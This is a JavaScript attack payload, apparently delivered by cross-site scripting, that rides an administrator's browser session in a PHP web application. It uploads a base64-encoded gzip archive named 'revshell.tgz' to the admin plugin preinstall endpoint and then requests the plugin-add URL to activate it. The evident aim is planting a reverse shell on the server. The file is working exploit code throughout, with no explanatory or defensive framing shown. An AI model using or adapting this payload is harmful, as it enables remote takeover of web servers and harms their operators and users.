// Read XHR body
function read_body(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    } else {
        data = xhr.response;
    }
    return data;
}

// Log response to console
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        console.log(read_body(xhr));
    }
}

function getBinary(file){
    var xhr = new XMLHttpRequest();  
    var data = '';
    xhr.open("GET", file, false);  
    xhr.send(null);
    return data;
}

function b64toBlob(b64Data, contentType, sliceSize) {
    contentType = contentType || '';
    sliceSize = sliceSize || 512;

    var byteCharacters = atob(b64Data);
    var byteArrays = [];

    for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
        var slice = byteCharacters.slice(offset, offset + sliceSize);

        var byteNumbers = new Array(slice.length);
        for (var i = 0; i < slice.length; i++) {
            byteNumbers[i] = slice.charCodeAt(i);
        }

        var byteArray = new Uint8Array(byteNumbers);

        byteArrays.push(byteArray);
    }

    var blob = new Blob(byteArrays, {type: contentType});
    return blob;
}

function sendBinary(uri,fileData,nameVar,fileName) {
    xhr = new XMLHttpRequest();
    xhr.onload = () => {
        console.log(xhr.responseText);
    }
    xhr.open("POST", uri, false);

    var formData = new FormData();
    formData.append(nameVar, fileData, fileName);
    xhr.send(formData);
}

function addPlugin()
{
    var uri = "/index.php/admin/plugins/preinstall";
    var contentType = 'application/x-gzip';
    var b64fileData = "H4sIAAAAAAAAA+3TUW/TMBAH8D7nUxwTWrcHkrjtUipgU1VAvGxCiMJjlSbXxJIbR7ZTOqF9dy5Jy8OkFJDWgsT9pCqp76/YydlTt46lCnrHFJLxOGyupLkORLT/34yJ4VgMxiSicSGGo1EPro66qp3KutgA9IzW7lBus9RbuzrFik5q2vb/E25sjuo4G+F3+z8MxWgUUV0MBQ1x/0/gcf8/qiqThV/m5dPN8Yv+07mPHp3/KyGo/+HTLaHbf97/1zfUas9LVGwttJthsd8Mi3YzAG4dFunP8kwXzmil0OwC3ncPSGm0w8RhCs8XZVO4i9dIhTfQ3z+y/6oj+r5S6g/iM70u4+K+zk5nt+86c1/QWKmLOif80BedwWnlcm3q3AedamMx6YzOjapznfW3aBMjS7ebd24RXC4ttFVY0TQxGNzQ0hCa14RvOVKBPq4sMnAalM6y+lYWnbPc0YA9uI7mG7k6EvnCF93vfqvTSmEdrPt74HnlvZFZ3jzy6/zzzTOKttlqqWQCq6pImre26Kry4rKptXujhltMLs6CpSyCZWxzeJFAv72RcH0OQYqbwCVlICYDX0QvacUTX4wGQTSJJhBen4v+2WW7tgf6ed6D5/3t08MYY4wxxhhjjDHGGGOMMcYYY4z9G34ADZK0MAAoAAA=";
    fileData = b64toBlob(b64fileData, contentType); 
    var nameVar = "newPlugin";
    var fileName = "revshell.tgz";
    sendBinary(uri,fileData,nameVar,fileName);
    callPlugin(fileName);
}

function callPlugin(fileName)
{
    b64_fileName = btoa(fileName);
    var uri = "/index.php/admin/plugins/add/file/" + b64_fileName;
    xhr.open("GET",uri,true);
    xhr.send(null);
}

addPlugin();

